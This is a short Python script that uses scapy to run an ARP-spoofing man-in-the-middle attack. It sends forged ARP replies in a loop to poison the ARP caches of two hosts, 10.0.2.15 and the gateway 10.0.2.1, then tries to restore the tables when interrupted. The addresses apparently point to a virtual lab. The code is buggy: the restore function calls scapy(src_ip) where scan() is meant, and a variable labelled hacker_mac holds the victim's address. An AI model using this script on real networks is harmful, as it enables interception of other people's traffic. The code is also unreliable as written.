#!/usr/bin/env python

import scapy.all as scapy
import sys
import time

def scan(ip):
    arp_Req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_Req
    answered = scapy.srp(arp_req_broadcast, timeout=1)[0]
    return answered[0][1].hwsrc

def spoof(victim_ip, victim2_ip):

    hacker_mac = scan(victim_ip)
    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=hacker_mac, psrc=victim2_ip)
    scapy.send(packet)

def restore(dest_ip, src_ip):
    dest_mac=scan(dest_ip)
    src_mac=scapy(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip)
    scapy.send(packet, count=4)

victim_ip = "10.0.2.15"
victim2_ip = "10.0.2.1"

try:
    packet_send_c=0
    while True:
        spoof(victim_ip, victim2_ip)
        spoof(victim2_ip, victim_ip)
        packet_send_c = packet_send_c + 2
        print("\r[+] Sent" + str(packet_send_c))
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C.......Resseting ARP Tables....Please Wait.\n")
    restore(victim_ip, victim2_ip)
    restore(victim2_ip, victim_ip)

